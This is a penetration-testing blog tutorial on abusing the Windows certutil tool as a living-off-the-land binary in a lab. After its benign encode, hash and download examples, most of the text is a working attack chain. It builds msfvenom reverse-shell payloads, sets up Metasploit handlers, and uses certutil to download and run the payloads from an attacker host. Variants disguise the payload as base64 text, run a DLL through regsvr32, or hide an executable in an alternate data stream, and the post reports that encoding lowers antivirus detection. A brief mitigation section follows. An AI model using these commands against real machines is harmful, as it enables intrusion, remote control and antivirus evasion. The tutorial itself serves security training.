<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
            <h1 class="post-title entry-title">Windows for Pentester: Certutil</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/windows-for-pentester-certutil/" rel="bookmark"><time class="entry-date published" datetime="2019-12-03T09:18:47+00:00">December 3, 2019</time><time class="updated" datetime="2025-06-03T11:47:45+00:00">June 3, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, we will describe the utility of the Certutil tool and its importance in Windows Penetration Testing.</span></p>
<p class="ai-optimize-8"><span style="color: #000000;">Certutil is a preinstalled tool on Windows OS that can be used to download malicious files and evade Antivirus. It is one of the Living Off Land (LOL) Binaries.</span></p>
<p class="ai-optimize-10"><span style="color: #000000;">The main objective of publishing the series of “Windows for Pentesters” is to introduce the circumstances and any kind of hurdles that can be faced by any Pentester while solving CTF challenges or OSCP labs, which are based on the Windows Operating System. Here, we do not criticize any kind of misconfiguration that a network or system administrator does for providing higher permissions on any kind of programs/binaries/files &amp; etc.”</span></p>
<h3 class="ai-optimize-11"><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li class="ai-optimize-12"><span style="color: #000000;"><strong>Introduction</strong></span>
<ul>
<li class="ai-optimize-13"><span style="color: #000000;">What is certutil?</span></li>
<li class="ai-optimize-14"><span style="color: #000000;">What is Living off Land?</span></li>
<li class="ai-optimize-15"><span style="color: #000000;">Working with certutil?</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">What is Alternative Data Stream (ADS)?</span></li>
</ul>
</li>
<li class="ai-optimize-17"><span style="color: #000000;"><strong>Configurations used in Practical</strong></span></li>
<li class="ai-optimize-18"><span style="color: #000000;"><strong>Working with certutil</strong></span>
<ul>
<li class="ai-optimize-19"><span style="color: #000000;">Encoding</span></li>
<li class="ai-optimize-20"><span style="color: #000000;">Decoding</span></li>
<li class="ai-optimize-21"><span style="color: #000000;">Hashing</span></li>
<li class="ai-optimize-22"><span style="color: #000000;">Downloading</span></li>
<li class="ai-optimize-23"><span style="color: #000000;">Reading Error Code</span></li>
</ul>
</li>
<li class="ai-optimize-24"><span style="color: #000000;"><strong>Penetration Testing using certutil </strong></span>
<ul>
<li class="ai-optimize-25"><span style="color: #000000;">Compromising using Malicious Executable</span></li>
<li class="ai-optimize-26"><span style="color: #000000;">Compromising with Encoded Malicious DLL</span></li>
<li class="ai-optimize-27"><span style="color: #000000;">Compromising with Malicious Executable inside ADS</span></li>
</ul>
</li>
<li class="ai-optimize-28"><span style="color: #000000;"><strong>Mitigation</strong></span></li>
<li class="ai-optimize-29"><span style="color: #000000;"><strong>Conclusion</strong></span></li>
</ul>
<h3 class="ai-optimize-30"><span style="color: #800000;">Introduction</span></h3>
<h4 class="ai-optimize-31"><span style="color: #000000;">What is Certutil?</span></h4>
<p class="ai-optimize-32"><span style="color: #000000;">Certutil is a CLI program that dumps and displays certificate authority (CA) information, configures Certificate Services, backs up and restores CA components, and verifies certificates, key pairs, and certificate chains. It installs as part of Certificate Services.</span></p>
<h4 class="ai-optimize-33"><span style="color: #000000;">What is Living off Land?</span></h4>
<p class="ai-optimize-34"><span style="color: #000000;">In simple terms, it is an attack that exploits the concept of using system tools as backdoors. File-less attack is another example of LOL attack. Attackers who use this tactic work with trusted, in most cases, preinstalled system tools to carry out their attack. Attackers use these tactics to hide their malicious activity in plain sight among the other general activity inside the network or system. As these kinds of attacks operate without triggering any alerts, it is almost impossible for investigators to determine who is behind the said malicious activity, even if they discover it.</span></p>
<h4 class="ai-optimize-35"><span style="color: #000000;">What is Alternative Data Stream (ADS)?</span></h4>
<p class="ai-optimize-36"><span style="color: #000000;">The NTFS file system consists of the ADS feature. This is an inconspicuous feature that provides compatibility with files in the Macintosh file system. ADS enables files to incorporate more than one stream of data. In any instance, each file contains at least one data stream. Windows recognizes this default data stream as :$DATA.</span></p>
<p class="ai-optimize-37"><span style="color: #000000;">Hackers often use techniques to hide files on machines they’ve compromised, making it challenging to detect ADSs in a file (or to erase them without discarding the original file). Users can create and access these ADSs with ease. The system can execute executables in ADSs from the command line without showing them in Windows Explorer.</span></p>
<p class="ai-optimize-38"><span style="color: #000000;">Some CTF Challenges over HackTheBox use certutil:</span></p>
<p class="ai-optimize-39"><span style="color: #000000;"><strong>Access, Arctic, BigHead, Conceal, Ethereal, Fighter, Giddy, Hackback, Jerry, Rabbit.</strong></span></p>
<h3 class="ai-optimize-40"><span style="color: #800000;">Configurations used in Practical</span></h3>
<p class="ai-optimize-41"><span style="color: #000000;"><strong>Attacker: </strong></span></p>
<ul>
<li class="ai-optimize-42"><span style="color: #000000;"><strong>OS:</strong> Kali Linux 2019.4</span></li>
<li class="ai-optimize-43"><span style="color: #000000;"><strong>IP:</strong>192.168.1.10</span></li>
</ul>
<p class="ai-optimize-44"><span style="color: #000000;"><strong>Target: </strong></span></p>
<ul>
<li class="ai-optimize-45"><span style="color: #000000;"><strong>OS:</strong> Windows 10 (Build 18363)</span></li>
<li class="ai-optimize-46"><span style="color: #000000;"><strong>IP: </strong>192.168.1.11</span></li>
</ul>
<h3 class="ai-optimize-47"><span style="color: #800000;">Working with certutil</span></h3>
<h4 class="ai-optimize-48"><span style="color: #000000;">Practical #1: Encoding</span></h4>
<p class="ai-optimize-49"><span style="color: #000000;">Certutil contains an encode parameter. It could help to encode file content into Base64. This is a Windows equivalent to the base64 command in Linux.</span></p>
<p class="ai-optimize-50"><span style="color: #000000;">When working with an executable file, we came across a scenario. In it, the uploading of the executable file was not smooth. We can use certutil to encode the executable file. Then transfer the encoded data, then decode it on the recipient machine.</span></p>
<p class="ai-optimize-51"><span style="color: #000000;">In the following practical, we first created a text file named “file.txt” and wrote the “This is a plain text” line in it. We did this with Add-Content cmdlet in PowerShell. We can see that it worked when we checked the file using type command. To convert, we will use certutil with encode parameter. We will provide the text file and the file that it should write the encoded data.</span></p>
<p class="ai-optimize-52"><span style="color: #000000;">Certutil adds two segments “BEGIN CERTIFICATE” and “END CERTIFICATE”. The converted contents of the file are between these two segments. We can check the encoded text using the type command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">Add-Content file.txt "This is a plain text"
type .\file.txt
certutil -encode file.txt encoded.txt
type .\encoded.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-5Jw3riPCOJ4/XeYjBwyl7BI/AAAAAAAAhxQ/EssLCnZ_uYwcdqvf6fUBuqgK_A9_dP1WACLcBGAsYHQ/s1600/1.png"/></p>
<p class="ai-optimize-53"><span style="color: #000000;">We can use the parameter -encodehex to convert data into Hex encoded files.</span></p>
<h4 class="ai-optimize-54"><span style="color: #000000;">Practical #2: Decoding</span></h4>
<p class="ai-optimize-55"><span style="color: #000000;">Certutil can decode the data encoded in Base64. Let’s show you a quick method from which you can decode the data. We will be using the file that we encoded in the previous practical. We will use certutil with -decode parameter. Then provide the encoded file and the file it should write the decoded data. We can check the decoded text using the type command.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">type .\encoded.txt
certutil -decode encoded.txt decoded.txt
type .\decoded.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-B1x59959I7U/XeYjFjWEiNI/AAAAAAAAhx8/diX2cBJarXUB85t9FuUG2b32f_V9UOWTgCLcBGAsYHQ/s1600/2.png"/></p>
<p class="ai-optimize-56"><span style="color: #000000;">We can use the parameter -decodehex to decode the Hex encoded files.</span></p>
<h4 class="ai-optimize-57"><span style="color: #000000;">Practical #3: Hashing</span></h4>
<p class="ai-optimize-58"><span style="color: #000000;">Hashing means taking data and giving out an output string of a fixed length. Using the cryptography hashing algorithms — e.g., MD5, SHA-1, SHA-256, you can verify if two files are identical or not. The checksum is a hash value used for performing data integrity checks. It’s a kind of signature for a file. By comparing checksum, we can identify duplicate files.</span></p>
<p class="ai-optimize-59"><span style="color: #000000;">Time to generate some hashes. We will use the file.txt we created earlier. First, we will generate the MD5 hash using certutil parameter -hashfile. With the parameter, file path and algorithm we can hash the file.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-bl15zdvsjEw/XeYjG9PyTbI/AAAAAAAAhyM/tu2eC9YPtcoKC_xPrpG4MFul3w8qUFokACLcBGAsYHQ/s1600/3.png"/></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil -hashfile ".\file.txt" md5
certutil -hashfile ".\file.txt" sha1
certutil -hashfile ".\file.txt" sha256</pre>
<p class="ai-optimize-60"><span style="color: #000000;"><strong>NOTE:</strong> While working with Systems like Windows 7, keep in mind that the hash algorithms are case-sensitive. Be sure to type, for example, “MD5”, not “md5”.</span></p>
<h4 class="ai-optimize-6"><span style="color: #000000;">Practical #4: Downloading</span></h4>
<p class="ai-optimize-62"><span style="color: #000000;">In scenarios, where wget, BITSAdmin or any other convention method is blocked. Certutil can be used to download files from the internet. We will be downloading 7zip.exe from the 7zip server as shown in the image.</span></p>
<table>
<tbody>
<tr>
<td width="376"><span style="color: #000000;">-URLCache</span></td>
<td width="376"><span style="color: #000000;">Display or delete URL cache entries</span></td>
</tr>
<tr>
<td width="376"><span style="color: #000000;">-split</span></td>
<td width="376"><span style="color: #000000;">Split embedded ASN.1 element &amp; Save to files</span></td>
</tr>
<tr>
<td width="376"><span style="color: #000000;">-f</span></td>
<td width="376"><span style="color: #000000;">Force Overwrite</span></td>
</tr>
</tbody>
</table>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
dir</pre>
<h3><img decoding="async" src="https://1.bp.blogspot.com/-gQCPrKOCx8g/XeYjHX49HXI/AAAAAAAAhyQ/9WTE493osgkmpttEIGaZzxF29rAEOjNGwCLcBGAsYHQ/s1600/4.png"/></h3>
<h4 class="ai-optimize-63"><span style="color: #000000;">Practical #5: Reading Error Code </span></h4>
<p class="ai-optimize-64"><span style="color: #000000;">Suppose you got a system error code without any message. You don’t have any source to look up the meaning of the error. This is a common scenario. Certutil can help to look up the message text for system error codes.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil -error 8200
certutil -error 0x200</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-7JgRsWB--mM/XeYjHtci_sI/AAAAAAAAhyU/hMnaRbW0ancNEt5dw4dkFW2VPoIF_tijQCLcBGAsYHQ/s1600/5.png"/></p>
<p class="ai-optimize-65"><span style="color: #000000;"><strong>NOTE:</strong> Certutil can perform many more functions related to CA Certificates but we will be focusing on Penetration Testing for now.</span></p>
<h3 class="ai-optimize-66"><span style="color: #800000;">Penetration Testing using certutil </span></h3>
<h4 class="ai-optimize-67"><span style="color: #000000;">Practical #6: Compromising using a Malicious Executable</span></h4>
<p class="ai-optimize-68"><span style="color: #000000;">During our initial assessment, we saw that the certutil was actively downloading files from the internet without any kind of verification or assessment. This is an instance that is part of the <a style="color: #000000;" href="https://attack.mitre.org/techniques/T1105/"><strong>MITRE | ATT&amp;CK Remote File Copy Tactic</strong></a><strong>.</strong></span></p>
<p class="ai-optimize-69"><span style="color: #000000;">Attackers can use Certutil to copy a file from one system to another to stage some attacking tools or other files throughout an attack. They can also transfer files from an outer attacker-controlled system through a Command and Control Channel to bring tools or scripts into the target network to support Lateral Movement.</span></p>
<p class="ai-optimize-70"><span style="color: #000000;">In the previous practical, we downloaded a file from a remote server. Let’s see how we can compromise a Windows System using a Malicious Executable.</span></p>
<h5 class="ai-optimize-11"><span style="color: #000000;"><strong>Creating the Payload and Hosting It</strong></span></h5>
<p class="ai-optimize-71"><span style="color: #000000;">Our attack began with the development of exploits. We created a payload for a reverse TCP connection to our attacker’s computer using the msfvenom program. We supplied the proper LHOST and LPORT to the msfvenom. The payload was formatted as an executable (.exe) file. We gave it the name “shell.exe”. The file was produced in our “/root” directory following a successful run. We now chose to use the HTTP Server created using a Python one-liner to send the freshly generated.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.10 lport=1234 -f exe &gt; shell.exe
python -m SimpleHTTPServer 80</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-THXLxeRgaNc/XeYjH4LXDjI/AAAAAAAAhyY/FExgVEQEAUMqRM3TbG6-cgC2RzR51AM6ACLcBGAsYHQ/s1600/6.png"/></p>
<p class="ai-optimize-72"><span style="color: #000000;">Now that the payload is hosted on the server, before executing the payload on the Target Machine, we need to start a Listener on Attacker Machine to capture the meterpreter session that would be generated after the execution of the payload.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.10
set lport 1234
exploit</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-NQuhpkuhCQo/XeYjIFAJD1I/AAAAAAAAhyc/q_HUAN5PEBgUfzqnRIxTeWRf4mcdyqovQCLcBGAsYHQ/s1600/7.png"/></p>
<h5 class="ai-optimize-12"><span style="color: #000000;"><strong>Downloading and Executing the Payload</strong></span></h5>
<p class="ai-optimize-73"><span style="color: #000000;">After successfully starting a listener on the Attacker, its time to move to Target Machine. Here, we have a PowerShell Terminal. We need to download the payload to this machine. We will use certutil to fetch it. Certutil will make two connections to the remote web server using two different User-Agents. They will be named “Microsoft-CryptoAPI” and “Certutil URL Agent”.</span></p>
<p class="ai-optimize-74"><span style="color: #000000;"><strong>NOTE:</strong> During our assessment, we found that upon execution the above command an Access Denied Error is notified. Using -verifyCTL instead of -URLCache will let you bypass this error.</span></p>
<p class="ai-optimize-75"><span style="color: #000000;">After the successful transfer of the Payload to Target Machine. We executed the payload as shown in the image.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil.exe -urlcache -split -f http://192.168.1.10/shell.exe shell.exe
.\shell.exe</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/--mUngj31shw/XeYjIhnJjNI/AAAAAAAAhyg/4sBJEYKmCl4xddeLlnQGZOEf2oRiCwm2gCLcBGAsYHQ/s1600/8.png"/></p>
<p class="ai-optimize-76"><span style="color: #000000;">When we returned to our Attacker Machine, we discovered that our listener had created and captured a meterpreter instance. To view the Target System’s details, we execute sysinfo.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sysinfo</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-bHb-vjClhLM/XeYjIz4A1xI/AAAAAAAAhyk/zLlKI7azBmA3s-7lqeCexwV12RTMMafhACLcBGAsYHQ/s1600/9.png"/></p>
<p class="ai-optimize-77"><span style="color: #000000;">With the use of a malicious executable and Certutil, we were able to successfully compromise the target machine.</span></p>
<h4 class="ai-optimize-78"><span style="color: #000000;">Practical #7: Compromising with Encoded Malicious DLL</span></h4>
<p class="ai-optimize-79"><span style="color: #000000;">As seen earlier Certutil encodes file content into Base64. This opens up a lot of possibilities. This is an instance that is part of <a style="color: #000000;" href="https://attack.mitre.org/techniques/T1140/">MITRE | ATT&amp;CK Deobfuscate/Decode Files or Information Tactic</a>.</span></p>
<p class="ai-optimize-80"><span style="color: #000000;">Attackers can use Obfuscated (Difficult to detect/find) Files to conceal evidence of an attack from the analysis. Afterward, they may Deobfuscate (Unhide) those files. This is where certutil comes into the picture. It can decode the data and help bypass Antivirus, IDS/IPS Software. Certutil can also be used to decode a portable executable file that has been hidden inside a certificate file.</span></p>
<p class="ai-optimize-81"><span style="color: #000000;">Attackers may compress, archive, or encrypt payloads to avoid detection. They may use these payloads with Obfuscated Files or Information during Initial Access or later to mitigate detection. Sometimes, the user may need to take action to open it for deobfuscation or decryption as part of User Execution. The user may also need to input a password to open a password-protected compressed/encrypted file that the attacker provided. Now onto our Practical.</span></p>
<h5 class="ai-optimize-10"><strong><span style="color: #000000;">Creating the Payload and Hosting It</span></strong></h5>
<p class="ai-optimize-82"><span style="color: #000000;">Our attack began with the development of exploits. We created a payload for a reverse TCP connection to our attacker’s computer using the msfvenom program. We supplied the proper LHOST and LPORT to the msfvenom. The payload was formatted as a Dynamic-Link Library (.dll) File. We gave it the name “dll.txt”. We can give it any other, less suspicious name. In order to avoid raising any unnecessary red flags, we employ the text file. The file was produced in our “/root” directory following a successful run. We now choose to use the HTTP Server created using a Python one-liner to send the freshly generated.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.10 lport=1234 -f dll &gt; dll.txt
python -m SimpleHTTPServer 80</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-mfyGepX6wvM/XeYjCJmf3II/AAAAAAAAhxY/ZkDdJJS1eCow7v9rF1WWbG1mhKX_YgR9gCLcBGAsYHQ/s1600/10.png"/></p>
<p class="ai-optimize-83"><span style="color: #000000;">Now that we have hosted the payload on the server, before executing the payload on the Target Machine, we need to start a Listener on the Attacker Machine to capture the Meterpreter session that will be generated after we execute the payload.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.10
set lport 1234
exploit</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-4Y5hJ3E21wQ/XeYjCOCzjoI/AAAAAAAAhxU/9JLYOnAInLo3Dzp74344waBAzLFVedyggCLcBGAsYHQ/s1600/11.png"/></p>
<h5 class="ai-optimize-8"><strong><span style="color: #000000;">Encoding, Downloading, and Executing the Payload</span></strong></h5>
<p class="ai-optimize-84"><span style="color: #000000;">After successfully starting a listener on the Attacker, it times to move to Target Machine. Here, we have a PowerShell Terminal. We need to download the payload to this machine and we need to do this discreetly. We run certutil with a combination of URLCache and encode separated by the pipe (|). Now the file will be downloaded as a text file and gets encoded as another text file which we named “edll.txt” for encoded DLL.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil -urlcache -split -f http://192.168.1.10/dll.txt dll.txt | certutil -encode dll.txt edll.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-MSaTBsq7oYQ/XeYjC4VteCI/AAAAAAAAhxc/4OsjmI8zdIo6YctvYK3MjRIghnDVUYB7ACLcBGAsYHQ/s1600/12.png"/></p>
<p class="ai-optimize-85"><span style="color: #000000;">Now to execute the payload to compromise the target, we need to decode it. We use the decode parameter in certutil to decode the payload and saved it as “exploit.dll”. Now to execute this DLL we decide to use regsvr32. It executes DLL directly into memory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil -decode .\edll.txt exploit.dll
regsvr32 /s /u .\exploit.dll</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-NtA79N7jP_8/XeYjDKomFtI/AAAAAAAAhxg/V50KDX3lXe0HaQj8Qkkx-aO59FwAQykjwCLcBGAsYHQ/s1600/13.png"/></p>
<p class="ai-optimize-86"><span style="color: #000000;">When we returned to our Attacker Machine, we discovered that our listener had created and captured a Meterpreter instance. To view the Target System’s details, we execute sysinfo. By utilizing Certutil in conjunction with an encoded malicious executable, we were able to successfully infect the target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sysinfo</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-faJOfKCoph4/XeYjDQoWY6I/AAAAAAAAhxk/I5G9qoCgSbYsCBY1eXBmXM438RKlrk-egCLcBGAsYHQ/s1600/14.png"/></p>
<h5 class="ai-optimize-9"><strong><span style="color: #000000;">Antivirus Evasion and Variant Attack Scenario</span></strong></h5>
<p class="ai-optimize-87"><span style="color: #000000;">As we talked about evading Antivirus Software. Let’s inspect the files that we generated and used in the attempt to compromise the target. We use VirusTotal for this analysis. We first inspect the “dll.txt”. Upon successful upload and analysis of the dll.txt, we see that it was detected by 54 out of 67 Antivirus Engines. That can’t be good.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-W73tY-e5yzk/XeYjD4yPMNI/AAAAAAAAhxo/LQiSDDs8Hb4byq73Gb329ZefnFJpwyGlQCLcBGAsYHQ/s1600/15.png"/></p>
<p class="ai-optimize-88"><span style="color: #000000;">So, the inspection of the dll.txt file was not acceptable. Now let’s test the file we encoded using certutil. We uploaded the edll.txt. Upon analysis of the edll.txt, we see that it was detected by 4 out of 56 Antivirus Engines. It is not perfect but it is a huge difference. </span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-DdXnWV77_ls/XeYjD5aELYI/AAAAAAAAhxs/1qLgrry5GIEatRNUDt48m0nLHp_6dVU-wCLcBGAsYHQ/s1600/16.png"/></p>
<p class="ai-optimize-89"><span style="color: #000000;">Another flavour of this attack can be as depicted below:</span></p>
<p class="ai-optimize-90"><span style="color: #000000;">We create a payload in the form of an executable(payload.exe). Then we use certutil to encode it to a specific binary. For example, “payload.enc”. Then post the output of the encoding process on GitHub, Pastebin or other alternative services. The purpose of this procedure is to separate the encoded payload from the stager to avoid detection. Now use the certutil on the target machine to download the content from the remote server (Github/Pastebin). Finally, decode the malicious payload into an executable extension using Certutil and execute it to compromise the Target.</span></p>
<h4 class="ai-optimize-91"><span style="color: #000000;">Practical #8: Compromising with Malicious Executable inside ADS</span></h4>
<p class="ai-optimize-92"><span style="color: #000000;">Our attack began with the development of exploits. We created a payload for a reverse TCP connection to our attacker’s computer using the msfvenom program. We supplied the proper LHOST and LPORT to the msfvenom. The format of the payload was set to an Executable(.exe) File. We named it “virus.exe”. After successful execution, the file was created in our “/root” directory. Now to transfer the newly generated, we decided to use the HTTP Server generated by a Python One-liner. </span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.10 lport=443 -f exe &gt; "virus.exe"
python -m SimpleHTTPServer 80</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-bPUMAxjS0Nk/XeYjEZd-AlI/AAAAAAAAhxw/LrBPJFaGTJIThO8INizoHFQchJD-jsmLgCLcBGAsYHQ/s1600/17.png"/></p>
<p class="ai-optimize-93"><span style="color: #000000;">Now that we have hosted the payload on the server, before we execute the payload on the Target Machine, we need to start a Listener on the Attacker Machine to capture the meterpreter session that will be generated after executing the payload.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.10
set lport 1234
exploit</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-XxD9cNOl7RQ/XeYjE7wIHCI/AAAAAAAAhx0/ez3t2z1K89oJU5ubmiE3AseEnyputTEYACLcBGAsYHQ/s1600/18.png"/></p>
<h5 class="ai-optimize-7"><strong><span style="color: #000000;">Storing Executable in ADS via Certutil</span></strong></h5>
<p class="ai-optimize-94"><span style="color: #000000;">This time we will use a different approach altogether. We are going to use the Alternative Data Stream. Alternative Data Stream (ADS) was created by Microsoft to supporting compatibility with Apple McIntosh’s file system. In the Mac, files have a huge amount of metadata in addition to regular data. To save the exe file into ADS, we need to specify the name of the file in whose ADS we want to save another file, then (:) followed by name and extension of another file. As shown, we saved the virus.exe inside the ADS of harmless.txt file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">certutil.exe -urlcache -split -f http://192.168.1.10/virus.exe harmless.txt:virus.exe</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-G4sBWwpD8Ng/XeYjFbDsZgI/AAAAAAAAhx4/CP1NwMKllnI_JcKapwGB0esNNRP32KebgCLcBGAsYHQ/s1600/19.png"/></p>
<p class="ai-optimize-95"><span style="color: #000000;">Monitor certutil usage, particularly if you see users using it with -decode or -decodeHex options where that would not normally be expected in your network.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dir
type .\harmless.txt</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Wce7FfUhO8I/XeYjFjIrebI/AAAAAAAAhyA/X5a0f-Effaw7vQ5Hf2ahrGE6Y9_GpkqXACLcBGAsYHQ/s1600/20.png"/></p>
<p class="ai-optimize-96"><span style="color: #000000;">Then, to execute the file that we put in the ADS; we will be using wmic. We will use the create flag followed by the path of the payload as shown in the image. It says that the Execution was successful.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">wmic process call create "c:\harmless.txt:virus.exe"</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-v142bn1hWm0/XeYjGaD0STI/AAAAAAAAhyE/JnAEOdjH43MYpSpH8AsLIP8vyhazEKtUwCLcBGAsYHQ/s1600/21.png"/></p>
<p class="ai-optimize-97"><span style="color: #000000;">When we returned to our Attacker Machine, we discovered that our listener had created and captured a meterpreter instance. To view the Target System’s details, we execute sysinfo.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">sysinfo</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-IeEfxmIIk0M/XeYjGg0HhBI/AAAAAAAAhyI/w6V-5YgB0ugJXI29P8_7pqgiFytmj3r0ACLcBGAsYHQ/s1600/22.png"/></p>
<p class="ai-optimize-98"><span style="color: #000000;">By combining Certutil with a malicious executable hidden in an alternate data stream, we were able to successfully compromise the target machine.</span></p>
<h3 class="ai-optimize-99"><span style="color: #800000;">Mitigation</span></h3>
<p class="ai-optimize-100"><span style="color: #000000;">Attackers with physical access to the machine or malicious code that users unknowingly download after a phishing or other social engineering attack can use tools like certutil.</span></p>
<p class="ai-optimize-101"><span style="color: #000000;">You should monitor certutil usage, particularly if you detect users employing it with -decode or -decodeHex options where that would not normally be expected in your network. It is paramount not to depend on tools that simply whitelist built-in or signed code, as such Living Off the Land (LOL) techniques will bypass these.</span></p>
<h3 class="ai-optimize-102"><span style="color: #800000;">Conclusion</span></h3>
<p class="ai-optimize-103"><span style="color: #000000;">This kind of attack is very much happening in real life. There have been multiple incidents targeted to different office environments as well as banks. It was a fun learning experience working with certutil. We are going to write more articles about other LOLS that we could find. Stay Tuned.</span></p>
<p class="ai-optimize-104"><span style="color: #000000;"><a style="color: #000000;" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil">Certutil Operations</a></span></p>
<p class="ai-optimize-105"><span style="color: #000000;"><a style="color: #000000;" href="https://lolbas-project.github.io/">Living Off Land binaries</a></span></p>
<p class="ai-optimize-6"><span style="color: #000000;">To learn more about Red Teaming. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/red-teaming/">link.</a></strong></p>
<p class="ai-optimize-106"><span style="color: #000000;"><strong>A<span style="color: #000000;">uthor: Pavandeep Singh</span></strong> is a Technical Writer, Researcher and Penetration Tester. Contact on  Twitter and <a href="https://www.linkedin.com/in/pavandeep-singh-6b1074132"><span style="color: #000000;">LinkedIn</span></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
